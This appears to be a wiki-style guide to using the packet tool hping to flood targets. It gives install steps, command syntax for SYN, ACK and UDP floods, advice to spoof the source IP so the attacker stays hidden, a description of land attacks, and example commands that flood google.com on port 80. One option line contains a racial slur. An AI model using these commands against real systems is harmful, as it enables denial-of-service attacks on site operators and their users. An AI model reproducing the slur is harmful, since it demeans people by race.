A tool for custom-crafting packets. Can be used to flood almost any type of packet imaginable.

If you're running Windows XP and it keeps crashing, set the "compatibility mode" for Windows 98.

Debian and Ubuntu users type

 sudo apt-get install hping3

Mandriva users type as root

 urpmi hping

= Usage =

Regardless of which '''Hping''' you get, the command to flood a target is as follows:

 '''hping'''[2 or 3] [TARGET] -p [PORT] -i u30000 [PACKET TYPE] [OTHER OPTIONS]

[TARGET] can be a URL or IP address [PORT] is the target port [PACKET TYPE] can be

* -S for SYN
* -A for ACK
* -S -A for SYN/ACK

OTHER OPTIONS:

* --udp to send UDP packets
* -q to suppress output - might make it a little faster
* -c [NUMBER] to limit to a certain number of packets
* the -i u30000 tells it to send packets 30 milliseconds apart - this is about as fast as windows XP can take it; unix/mac systems might be able to go lower. (-flood niggers)
* -a [IP] to spoof your IP address: it goes without saying that this is important, although you obviously won't receive reply packets. A land attack uses the target IP address as the spoofed source IP address.
* --rand-source gives each packet you send a randomly generated spoof IP address.

= Examples =

SYN flood google.com's port 80

 hping2 google.com -p 80 -i u30000 -S

UDP flood google.com:

 hping3 google.com -p 80 -i u30000 --udp
